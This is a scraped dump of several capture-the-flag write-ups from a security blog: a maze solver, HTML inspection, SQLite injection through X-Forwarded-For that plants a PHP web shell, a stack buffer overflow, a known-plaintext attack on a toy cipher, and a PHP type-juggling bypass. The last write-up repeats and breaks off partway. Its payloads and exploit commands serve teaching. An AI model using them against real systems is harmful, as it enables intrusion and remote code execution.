☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 ☠️ 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔩 🔩 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 💎 ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ ☠️ 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 🔥 \u0026gt;  We need to provide some instructions so that the robot (🤖) finds the diamond (💎) and collects some screws (🔩). Since we need to do this process 500 times, we must use a path finding algorithm.\nFor instance, we can use Depth First Search (DFS):\nmovements={ (0, 1): 'R', (0, -1): 'L', (1, 0): 'D', } final_path='' defdfs(root, maze, visited, path=''): globalfinal_path if-1inrootorlen(maze) \u0026lt;=root[0] orlen(maze[0]) \u0026lt;=root[1]: return ifmaze[root[0]][root[1]] =='💎'andfinal_path=='': final_path=path visited.add(root) formovementin[(1, 0), (0, -1), (0, 1)]: node=(root[0] +movement[0], root[1] +movement[1]) if-1innodeorlen(maze) \u0026lt;=node[0] orlen(maze[0]) \u0026lt;=node[1]: continue ifnodenotinvisitedandmaze[node[0]][node[1]] !='☠️': dfs(node, maze, visited.copy(), path+movements[movement])  So, we only need to parse the maze and use the DFS algorithm on each round:\ndefmain(): globalfinal_path iflen(sys.argv) !=2: log.warning(f'Usage: python3 {sys.argv[0]}\u0026lt;host:port\u0026gt;') exit(1) host, port=sys.argv[1].split(':') r=remote(host, int(port)) r.sendlineafter(b'\u0026gt; ', b'2') prog=log.progress('Round') forroundinrange(500): prog.status(str(round+1)) r.recvline() maze=list(map( lambdas: s.split()[1:-1], r.recvuntil(b'\\n\\n').strip().decode().splitlines() ))[1:-1] j=maze[0].index('🤖') dfs((0, j), maze, {(0, j)}) r.sendlineafter(b'\u0026gt; ', final_path.encode()) final_path='' r.recvline() prog.success(str(round+1)) print(r.recv().decode()) r.close()  Using this solution script: solve.py we can obtain the flag:\n$ python3 solve.py 206.189.125.243:30182 [+] Opening connection to 206.189.125.243 on port 30182: Done [+] Round: 500 [+] You have 10016 🔩 ! [+] Congratulations! This is your reward! HTB{w1th_4ll_th353_b0lt5_4nd_g3m5_1ll_cr4ft_th3_b35t_4ndr01d_3v3r!!!} [*] Closed connection to 206.189.125.243 port 30182  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/insane-bolt/","section":"ctf","summary":"Depth First Search","time":4,"title":"Insane Bolt"},{"contents":"We are given a website like this:\nAs the page suggests, we must inspect the HTML code of the website (shortcut: Ctrl + U):\nWe can see a piece of the flag. Let\u0026rsquo;s inspect the CSS file (mycss.css):\nAlright, we got another piece. We can take a look at the JS file (myjs.js):\nPerfect, we can join all pieces to form the flag: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?f10be399}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/web-exploitation/insp3ct0r/","section":"ctf","summary":"picoCTF 2019. 50 points. HTML, CSS and JS","time":1,"title":"Insp3ct0r"},{"contents":"We are given a PHP web application with a single functionality, that is to post an email address.\nWe can start by analyzing the source code. The file index.php shows that there are only two endpoints (GET and POST):\n\u0026lt;?php spl_autoload_register(function ($name){ if (preg_match('/Controller$/', $name)) { $name = \"controllers/${name}\"; } else if (preg_match('/Model$/', $name)) { $name = \"models/${name}\"; } include_once \"${name}.php\"; }); $database = new Database('/tmp/challenge.db'); $router = new Router(); $router-\u0026gt;new('GET', '/', 'IndexController@index'); $router-\u0026gt;new('POST', '/subscribe', 'SubsController@store'); die($router-\u0026gt;match());  We can see that Database.php is vulnerable to SQL injection:\n\u0026lt;?php class Database { private static $database = null; public function __construct($file) { if (!file_exists($file)) { file_put_contents($file, ''); } $this-\u0026gt;db = new SQLite3($file); $this-\u0026gt;migrate(); self::$database = $this; } public static function getDatabase(): Database { return self::$database; } public function migrate() { $this-\u0026gt;db-\u0026gt;query(' CREATE TABLE IF NOT EXISTS `subscribers` ( id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address VARCHAR(255) NOT NULL, email VARCHAR(255) NOT NULL ); '); } public function subscribeUser($ip_address, $email) { return $this-\u0026gt;db-\u0026gt;exec(\"INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')\"); } }  This is because it is using string interpolation in PHP, so the contents of variables $ip_address and $email is inserted in the SQL query without sanitization:\nreturn $this-\u0026gt;db-\u0026gt;exec(\"INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')\");  This function subscribeUser is called from models/SubscriberModel.php:\n\u0026lt;?php class SubscriberModel extends Model { public function __construct() { parent::__construct(); } public function getSubscriberIP() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { return $_SERVER[\"HTTP_X_FORWARDED_FOR\"]; } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) { return $_SERVER[\"REMOTE_ADDR\"]; } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) { return $_SERVER[\"HTTP_CLIENT_IP\"]; } return ''; } public function subscribe($email) { $ip_address = $this-\u0026gt;getSubscriberIP(); return $this-\u0026gt;database-\u0026gt;subscribeUser($ip_address, $email); } }  Furthermore, the method subscribe gets called from controllers/SubsController.php:\n\u0026lt;?php class SubsController extends Controller { public function __construct() { parent::__construct(); } public function store($router) { $email = $_POST['email']; if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) { header('Location: /?success=false\u0026amp;msg=Please submit a valild email address!'); exit; } $subscriber = new SubscriberModel; $subscriber-\u0026gt;subscribe($email); header('Location: /?success=true\u0026amp;msg=Email subscribed successfully!'); exit; } public function logout($router) { session_destroy(); header('Location: /admin'); exit; } }  Here we see that $email is being validated as a proper email address, so we won\u0026rsquo;t be able to exploit SQLi using $email.\nHowever, the variable $ip_address comes from HTTP request headers, so we can use some of them to introduce our SQLi payload. Namely, we will use X-Forwarded-For header:\npublic function getSubscriberIP() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { return $_SERVER[\"HTTP_X_FORWARDED_FOR\"]; } // ... }  Plus, we must take into account the type of database manager we are trying to exploit. We must exploit a SQLite database.\nHowever, the exploit won\u0026rsquo;t be focused on extracting information from the database because there is no useful information stored there. Moreover, SQLite does not allow to read files from the server.\nTaking a look at PayloadsAllTheThings, we can see that there is the possibility to gain Remote Code Execution in a PHP web application if using SQLite. This is the payload:\nATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (\"\u0026lt;?php system($_GET['cmd']); ?\u0026gt;\");--  What it does is create a new database file with .php extension and enter PHP code, so that we can retrieve the file from the web server and the PHP code gets executed.\nLet\u0026rsquo;s start the Docker instance and try the exploit estrategy locally. We have this form to put an email address:\nWe can intercept the request with Burp Suite and send it to Repeater to modify the request parameters:\nI modified the SQLi payload a bit, but it looks almost the same. Notice that the web server root folder is at /www, so the new database file will be at /www/databasexx.php:\nAlright, if everything was OK, we should have RCE and thus get the flag using cat /flag* (we know the flag has a random filename because it is configured in the Dockerfile as such):\n$ curl '127.0.0.1:1337/databasexx.php?cmd=cat%20/flag*' -o- ��@�AAAAAAAAAA HTB{f4k3_fl4g_f0r_t3st1ng}taz text) AAAAAAAAA $ curl 'http://127.0.0.1:1337/databasexx.php?cmd=cat%20/flag*' -so- | strings | grep -oE 'HTB\\{.*?\\}' HTB{f4k3_fl4g_f0r_t3st1ng}  Now, we need to spawn the remote instance and reproduce the attack. Finally, we get the flag:\n$ curl 'http://139.59.163.221:30572/databasexx.php?cmd=cat%20/flag*' -so- | strings | grep -oE 'HTB\\{.*?\\}' HTB{inj3ct3d_th3_in3vit4bl3_tru7h}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/intergalactic-post/","section":"ctf","summary":"SQLi in SQLite to RCE in PHP","time":4,"title":"Intergalactic Post"},{"contents":"We are given a 64-bit binary called jeeves:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is main:\nintmain() { charname[44]; intfd; void*data; uintcode; code =0xdeadc0d3; printf(\"Hello, good sir!\\nMay I have your name? \"); gets(name); printf(\"Hello %s, hope you have a good day!\\n\", name); if(code ==0x1337bab3) { data =malloc(0x100); fd =open(\"flag.txt\", 0); read(fd, data, 0x100); printf(\"Pleased to make your acquaintance. Here\\'s a small gift: %s\\n\", data); close(fd); } return0; }  The binary is vulnerable to Buffer Overflow since there is a variable called name that has 44 bytes assigned as buffer, but the program is using gets, which is an insecure function because it does not limit the length of the input data, thus overflowing the reserved buffer if the size of the input data is greater than 44 bytes.\nWe can check that it crashes in this situation:\n$ ./jeeves Hello, good sir! May I have your name? asdf Hello asdf, hope you have a good day! $ ./jeeves Hello, good sir! May I have your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, hope you have a good day! zsh: segmentation fault (core dumped) ./jeeves  The program crashes because we overwrote the saved return address and when the program tries to return, it finds out an invalid memory address.\nHowever, the objective of this challenge is to modify the variable called code and get the flag, we won\u0026rsquo;t be spawning a shell this time (plus, the protections would make this really hard to achieve).\nLet\u0026rsquo;s use GDB to find the offset to the value we want. One way of doing this is setting a breakpoint at the cmp instruction and using a pattern:\n$ gdb -q jeeves Reading symbols from jeeves... (No debugging symbols found in jeeves) gef➤ disassemble main Dump of assembler code for function main: 0x00000000000011e9 \u0026lt;+0\u0026gt;: endbr64 0x00000000000011ed \u0026lt;+4\u0026gt;: push rbp 0x00000000000011ee \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000000011f1 \u0026lt;+8\u0026gt;: sub rsp,0x40 0x00000000000011f5 \u0026lt;+12\u0026gt;: mov DWORD PTR [rbp-0x4],0xdeadc0d3 0x00000000000011fc \u0026lt;+19\u0026gt;: lea rdi,[rip+0xe05] # 0x2008 0x0000000000001203 \u0026lt;+26\u0026gt;: mov eax,0x0 0x0000000000001208 \u0026lt;+31\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x000000000000120d \u0026lt;+36\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001211 \u0026lt;+40\u0026gt;: mov rdi,rax 0x0000000000001214 \u0026lt;+43\u0026gt;: mov eax,0x0 0x0000000000001219 \u0026lt;+48\u0026gt;: call 0x10d0 \u0026lt;gets@plt\u0026gt; 0x000000000000121e \u0026lt;+53\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001222 \u0026lt;+57\u0026gt;: mov rsi,rax 0x0000000000001225 \u0026lt;+60\u0026gt;: lea rdi,[rip+0xe04] # 0x2030 0x000000000000122c \u0026lt;+67\u0026gt;: mov eax,0x0 0x0000000000001231 \u0026lt;+72\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x0000000000001236 \u0026lt;+77\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1337bab3 0x000000000000123d \u0026lt;+84\u0026gt;: jne 0x12a8 \u0026lt;main+191\u0026gt; 0x000000000000123f \u0026lt;+86\u0026gt;: mov edi,0x100 0x0000000000001244 \u0026lt;+91\u0026gt;: call 0x10e0 \u0026lt;malloc@plt\u0026gt; 0x0000000000001249 \u0026lt;+96\u0026gt;: mov QWORD PTR [rbp-0x10],rax 0x000000000000124d \u0026lt;+100\u0026gt;: mov esi,0x0 0x0000000000001252 \u0026lt;+105\u0026gt;: lea rdi,[rip+0xdfc] # 0x2055 0x0000000000001259 \u0026lt;+112\u0026gt;: mov eax,0x0 0x000000000000125e \u0026lt;+117\u0026gt;: call 0x10f0 \u0026lt;open@plt\u0026gt; 0x0000000000001263 \u0026lt;+122\u0026gt;: mov DWORD PTR [rbp-0x14],eax 0x0000000000001266 \u0026lt;+125\u0026gt;: mov rcx,QWORD PTR [rbp-0x10] 0x000000000000126a \u0026lt;+129\u0026gt;: mov eax,DWORD PTR [rbp-0x14] 0x000000000000126d \u0026lt;+132\u0026gt;: mov edx,0x100 0x0000000000001272 \u0026lt;+137\u0026gt;: mov rsi,rcx 0x0000000000001275 \u0026lt;+140\u0026gt;: mov edi,eax 0x0000000000001277 \u0026lt;+142\u0026gt;: mov eax,0x0 0x000000000000127c \u0026lt;+147\u0026gt;: call 0x10c0 \u0026lt;read@plt\u0026gt; 0x0000000000001281 \u0026lt;+152\u0026gt;: mov rax,QWORD PTR [rbp-0x10] 0x0000000000001285 \u0026lt;+156\u0026gt;: mov rsi,rax 0x0000000000001288 \u0026lt;+159\u0026gt;: lea rdi,[rip+0xdd1] # 0x2060 0x000000000000128f \u0026lt;+166\u0026gt;: mov eax,0x0 0x0000000000001294 \u0026lt;+171\u0026gt;: call 0x10a0 \u0026lt;printf@plt\u0026gt; 0x0000000000001299 \u0026lt;+176\u0026gt;: mov eax,DWORD PTR [rbp-0x14] 0x000000000000129c \u0026lt;+179\u0026gt;: mov edi,eax 0x000000000000129e \u0026lt;+181\u0026gt;: mov eax,0x0 0x00000000000012a3 \u0026lt;+186\u0026gt;: call 0x10b0 \u0026lt;close@plt\u0026gt; 0x00000000000012a8 \u0026lt;+191\u0026gt;: mov eax,0x0 0x00000000000012ad \u0026lt;+196\u0026gt;: leave 0x00000000000012ae \u0026lt;+197\u0026gt;: ret End of assembler dump. gef➤ break *main+77 Breakpoint 1 at 0x1236 gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Jeeves/jeeves Hello, good sir! May I have your name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa Hello aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa, hope you have a good day! Breakpoint 1, 0x0000555555555236 in main ()  gef➤ x/i $rip =\u0026gt; 0x555555555236 \u0026lt;main+77\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1337bab3 gef➤ x/gx $rbp-0x4 0x7fffffffe68c: 0x6161616961616161 gef➤ pattern offset 0x6161616961616161 [+] Searching for '0x6161616961616161' [+] Found at offset 60 (little-endian search) likely [+] Found at offset 61 (big-endian search)  So, we can modify the value of code entering 60 bytes and then the value we want (obviously, 0x1337bab3, in little-endian format):\n$ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 60 + p64(0x1337bab3) + b\"\\n\")' | nc 178.128.46.251 32023 Hello, good sir! May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7, hope you have a good day! Pleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_\u0026_pa1n!}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/pwn/jeeves/","section":"ctf","summary":"64-bit binary. Buffer Overflow. Local variable modification","time":4,"title":"Jeeves"},{"contents":"We are given this Python source code:\nfromhashlibimportsha256 fromCrypto.Util.Paddingimportpad, unpad importsignal importsubprocess importsocketserver importos allowed_commands=[b'whoami', b'ls', b'cat secret.txt', b'pwd'] BLOCK_SIZE=32 defencrypt_block(block, secret): enc_block=b'' foriinrange(BLOCK_SIZE): val=(block[i]+secret[i]) %256 enc_block+=bytes([val]) returnenc_block defencrypt(msg, password): h=sha256(password).digest() iflen(msg) %BLOCK_SIZE!=0: msg=pad(msg, BLOCK_SIZE) blocks=[msg[i:i+BLOCK_SIZE] foriinrange(0, len(msg), BLOCK_SIZE)] ct=b'' forblockinblocks: enc_block=encrypt_block(block, h) h=sha256(enc_block+block).digest() ct+=enc_block returnct.hex() defrun_command(cmd): ifcmdinallowed_commands: try: resp=subprocess.run( cmd.decode().split(' '), capture_output=True) output=resp.stdout returnoutput except: returnb'Something went wrong!\\n' else: returnb'Invalid command!\\n' defchallenge(req): req.sendall(b'This is Jenny! I am the heart and soul of this spaceship.\\n'+ b'Welcome to the debug terminal. For security purposes I will encrypt any responses.') whileTrue: req.sendall(b'\\n\u0026gt; ') command=req.recv(4096).strip() output=run_command(command) response=b'Command executed: '+command+b'\\n'+output password=os.urandom(32) ct=encrypt(response, password) req.sendall(ct.encode()) classincoming(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(30) req=self.request challenge(req) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defmain(): socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if__name__==\"__main__\": main()  This code runs a server that allows us to execute system commands: whoami, ls, cat secret.txt or pwd. However, the output plus an information message is encrypted with these functions, in blocks of 32 bytes:\ndefencrypt_block(block, secret): enc_block=b'' foriinrange(BLOCK_SIZE): val=(block[i]+secret[i]) %256 enc_block+=bytes([val]) returnenc_block defencrypt(msg, password): h=sha256(password).digest() iflen(msg) %BLOCK_SIZE!=0: msg=pad(msg, BLOCK_SIZE) blocks=[msg[i:i+BLOCK_SIZE] foriinrange(0, len(msg), BLOCK_SIZE)] ct=b'' forblockinblocks: enc_block=encrypt_block(block, h) h=sha256(enc_block+block).digest() ct+=enc_block returnct.hex()  The thing is that \u0026quot;Command executed: cat secret.txt\u0026quot; is a 32-byte string, so we can perform a known plaintext attack:\n$ nc 178.62.23.240 30410 This is Jenny! I am the heart and soul of this spaceship. Welcome to the debug terminal. For security purposes I will encrypt any responses. \u0026gt; cat secret.txt 5b091883b5808f1feb09b9016a7c7e017511fd0b2593d78bbbda209866c7c4169512e84002c2e3ac7e832ffe996c849dd9604cea72e2d356626d7035b1e17c4c2bcf2f4a5473d6fd9118285ef447e59b1bf285ea6e9abfcc346c9be2b4a2edd68945681a2f94bb15006e1b1750f94c587410321c354c79f17511afbd2a0ace5156f5a11eee7203bd2f75ab5f604a2f03ea53aa2061aa61738c6dc63d3462d448daf150c44f4ef0dad081470ce61873b64f18adb3c8925cf3d03268b03de27db53674dfe6bd2fbf39bb00a8e4f67a0e643a6d2181cedba1b2a2ee7d851b0ab6ea344221047f06fbe43f9497c1dec632ec02940a885a114ed81b6bf81d0f5ed42d  Moreover, the first key is password = os.urandom(32), and after that, the previous block is used to craft the key for the next block (using a SHA256 hash). Hence, since we know 32-bytes of plaintext, we know that the SHA256 hash of this string is the key for the next block.\nTherefore, we can decrypt the next block using the SHA256 hash of the previous block, and inductively, decrypt all the blocks like this:\ndefmain(): p= get_process() p.sendlineafter(b'\u0026gt; ', b'cat secret.txt') ct=bytes.fromhex(p.recvline().strip().decode()) block=b'Command executed: cat secret.txt' secret=block i=0 whileb'}'notinsecret: h=sha256(ct[32*i: 32*(i+1)] +block).digest() block=decrypt_block(ct[32*(i+1) : 32*(i+2)], h) secret+=block i+=1 print(secret.decode()) p.close()  And this is the decryption function (inverse of encryption):\ndefdecrypt_block(enc_block, plaintext): dec_block=b'' foriinrange(BLOCK_SIZE): val=(enc_block[i] -plaintext[i]) %256 dec_block+=bytes([val]) returndec_block  Using this solution script: solve.py we can obtain the flag:\n$ python3 solve.py 178.62.23.240:30410 [+] Opening connection to 178.62.23.240 on port 30410: Done Command executed: cat secret.txt In case Jenny malfunctions say the following phrase: Melt My Eyez, See Your Future The AI system will shutdown and you will gain complete control of the spaceship. - Danbeer S.A. HTB{th1s_b451c_b107k_c1ph3r_1s_n0t_s@fe} [*] Closed connection to 178.62.23.240 port 30410  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/jenny-from-the-block/","section":"ctf","summary":"Block cipher. Known plaintext attack. Induction. SHA256","time":2,"title":"Jenny From The Block"},{"contents":"We are given this website:\nStatic code analysis We also have the PHP source code of the web application. The relevant part is in controllers/IndexController.php:\n\u0026lt;?php classIndexControllerextendsController { publicfunction__construct() { parent::__construct(); } publicfunctionindex($router) { $router-\u0026gt;view('index'); } publicfunctiongetfacts($router) { $jsondata =json_decode(file_get_contents('php://input'), true); if( empty($jsondata) ||!array_key_exists('type', $jsondata)) { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Insufficient parameters!']); } if($jsondata['type'] ==='secrets'\u0026amp;\u0026amp;$_SERVER['REMOTE_ADDR'] !=='127.0.0.1') { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Currently this type can be only accessed through localhost!']); } switch($jsondata['type']) { case'secrets': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('secrets') ]); case'spooky': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('spooky') ]);  case'not_spooky': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('not_spooky') ]);  default: return$router-\u0026gt;jsonify([ 'message'=\u0026gt;'Invalid type!' ]); } } }  We are interested in executing $this-\u0026gt;facts-\u0026gt;get_facts('secrets'), because there\u0026rsquo;s the flag (as shown in entrypoint.sh). Moreover, to interact with IndexController, we must use endpoint /api/getfacts:\n\u0026lt;?phpspl_autoload_register(function($name) { if(preg_match('/Controller$/', $name)) { $name =\"controllers/${name}\"; } elseif(preg_match('/Model$/', $name)) { $name =\"models/${name}\"; } include_once\"${name}.php\"; }); $database =newDatabase('localhost', 'root', 'M@k3l@R!d3s$', 'web_juggling_facts'); $database-\u0026gt;connect(); $router =newRouter(); $router-\u0026gt;new('GET', '/', 'IndexController@index'); $router-\u0026gt;new('POST','/api/getfacts', 'IndexController@getfacts'); die($router-\u0026gt;match());  Exploitation Going back to controllers/IndexController.php, it seems clear that we must bypass this check:\nif($jsondata['type'] ==='secrets'\u0026amp;\u0026amp;$_SERVER['REMOTE_ADDR'] !=='127.0.0.1') { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Currently this type can be only accessed through localhost!']); }  So that we reach the switch statement right below and access $this-\u0026gt;facts-\u0026gt;get_facts('secrets').\nMessing with HTTP headers At this point, we can start thinking of HTTP headers like X-Forwarded-For and set 127.0.0.1 so that we bypass the check when trying to see secrets.\nAfter a lot of attempts, we conclude that $_SERVER['REMOTE_ADDR'] cannot be spoofed this time. Hence, we need to find another approach.\nType Juggling At this point, I went back and noticed that the name of the challenge is \u0026ldquo;Juggling Facts\u0026rdquo;, which points to a vulnerability known as Type Juggling, which is very common in languages like PHP and JavaScript.\nType Juggling vulnerabilities appear when comparisons are == instead of ===, so only the value is compared, not the variable type. For instance:\n 1 == '1' is true 1 === '1' is false  If we look again at the code, we only see comparisons like ===, so Type Juggling is not exploitable\u0026hellip;\nFlag But let\u0026rsquo;s try anyway:\n$ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":\"secrets\"}' {\"message\":\"Currently this type can be only accessed through localhost!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":1}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":0}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":\"1\"}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":{}}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":[]}' {\"message\":\"Invalid type!\"} $ curl 159.65.49.148:31883/api/getfacts -d '{\"type\":true}' {\"facts\":[{\"id\":19,\"fact\":\"HTB{juggl1ng_1s_d4ng3r0u5!!!}\",\"fact_type\":\"secrets\"}]}  So it looks like switch(true) will execute the first option, which happens to be $this-\u0026gt;facts-\u0026gt;get_facts('secrets').\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/juggling-facts/","section":"ctf","summary":"PHP. Type Juggling","time":2,"title":"Juggling Facts"},{"contents":"We are given this website:\nStatic code analysis We also have the PHP source code of the web application. The relevant part is in controllers/IndexController.php:\n\u0026lt;?php classIndexControllerextendsController { publicfunction__construct() { parent::__construct(); } publicfunctionindex($router) { $router-\u0026gt;view('index'); } publicfunctiongetfacts($router) { $jsondata =json_decode(file_get_contents('php://input'), true); if( empty($jsondata) ||!array_key_exists('type', $jsondata)) { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Insufficient parameters!']); } if($jsondata['type'] ==='secrets'\u0026amp;\u0026amp;$_SERVER['REMOTE_ADDR'] !=='127.0.0.1') { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Currently this type can be only accessed through localhost!']); } switch($jsondata['type']) { case'secrets': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('secrets') ]); case'spooky': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('spooky') ]);  case'not_spooky': return$router-\u0026gt;jsonify([ 'facts'=\u0026gt;$this-\u0026gt;facts-\u0026gt;get_facts('not_spooky') ]);  default: return$router-\u0026gt;jsonify([ 'message'=\u0026gt;'Invalid type!' ]); } } }  We are interested in executing $this-\u0026gt;facts-\u0026gt;get_facts('secrets'), because there\u0026rsquo;s the flag (as shown in entrypoint.sh). Moreover, to interact with IndexController, we must use endpoint /api/getfacts:\n\u0026lt;?phpspl_autoload_register(function($name) { if(preg_match('/Controller$/', $name)) { $name =\"controllers/${name}\"; } elseif(preg_match('/Model$/', $name)) { $name =\"models/${name}\"; } include_once\"${name}.php\"; }); $database =newDatabase('localhost', 'root', 'M@k3l@R!d3s$', 'web_juggling_facts'); $database-\u0026gt;connect(); $router =newRouter(); $router-\u0026gt;new('GET', '/', 'IndexController@index'); $router-\u0026gt;new('POST','/api/getfacts', 'IndexController@getfacts'); die($router-\u0026gt;match());  Exploitation Going back to controllers/IndexController.php, it seems clear that we must bypass this check:\nif($jsondata['type'] ==='secrets'\u0026amp;\u0026amp;$_SERVER['REMOTE_ADDR'] !=='127.0.0.1') { return$router-\u0026gt;jsonify(['message'=\u0026gt;'Currently this type can be only accessed through localhost!']); }  So that we reach the switch statement right below and access $this-\u0026gt;facts-\u0026gt;get_facts('secrets').\nMessing with HTTP headers At this point, we can start thinking of HTTP headers like X-Forwarded-For and set 127.0.0.1 so that we bypass the check when trying to see secrets.\nAfter a lot of attempts, we conclude that $_SERVER['REMOTE_ADDR'] cannot be spoofed this time. Hence, we need to find another approach.\nType Juggling At this point, I went back and noticed that the name of the challenge is \u0026ldquo;Juggling Facts\u0026rdquo;, which points to a vulnerability known as Type Juggling, which is very common in languages like PHP and JavaScript.\nType Juggling vulnerabilities appear when comparisons are == instead of ===, so only the value is compared, not the variable type. For instance:\n 1 == '1' is true 1 === '1' is false  If we look again at the code, we only see 